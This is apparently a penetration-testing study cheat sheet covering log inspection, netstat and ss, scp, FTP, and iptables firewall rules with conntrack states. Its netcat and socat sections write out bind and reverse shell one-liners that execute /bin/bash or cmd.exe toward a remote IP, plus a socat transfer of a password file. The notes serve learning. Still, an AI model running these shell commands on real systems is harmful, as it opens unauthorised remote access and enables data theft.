### Show logger
who
last
/var/log 检查日志

### Show network connections
netstat -natup  
ss -natup

### Copy file from remote machine to local tmp
scp john@localhost:/var/tmp/CopyMe.txt /tmp  
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2

### echo current shell
echo $SHELL

### echo environmental variable
env

### NC transfering files
```
nc -lvnp 6666 > incoming.txt
nc -nv 192.168.65.61 6666 < incoming.txt
```

### NC bind shell
```
nc -nlvp 4444 -e cmd.exe
nc -nv 10.11.0.22 4444
```

### NC reverse shell
```
nc -nlvp 4444
nc -nv 10.11.0.22 4444 -e /bin/bash
```

### Socat connect remote machine
```
socat - TCP4:ip-address:80
```

### Socat transfer files
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### Socat reverse shell
```
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

### FTP(permitted commands:ls,mkdir,put file, get file)
```
anonymous login: ftp ip; username:anonymous;password:blank; 
ascii mode: ascii
binary mode: bin
```

### IPTables
```
sudo iptables -L (show iptables) --line-numbers(optional)
Append a rule to the INPUT chain for a source network of 192.168.1.0/24 for all protocols: sudo iptables -s 192.168.1.0/24 -p all -A(append)/D(delete)/I(insert) INPUT
sudo iptables -s 127.0.0.1 -d 127.0.0.1 -A INPUT
sudo iptables -s 192.168.1.37 -p tcp -A INPUT
sudo iptables -D INPUT 5(linenumber)
sudo iptables -nvL(show traffic)
sudo iptables -P FOWARD DROP(change default policy of forward to drop)
sudo iptables -R(replace) INPUT 1 -s 192.168.1.37 -d 127.0.0.1 -p tcp --dport 8080
Final: sudo iptables-save
```

#### stateful firewall
**INVALID**: The packet is associated with no known connection.  
**NEW**: The packet has started a new connection or otherwise associated with a connection that has not seen packets in both directions.  
**ESTABLISHED**: The packet is associated with a connection that has seen packets in both directions.  
**RELATED**: The packet is starting a new connection, but is associated with an existing connection, such as an FTP data transfer or an ICMP error.  
**UNTRACKED**: The packet is not tracked at all, which happens if you explicitly un-track it by using -j CT --notrack in the raw table.  
```
sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP
sudo iptables -L --line-numbers
```
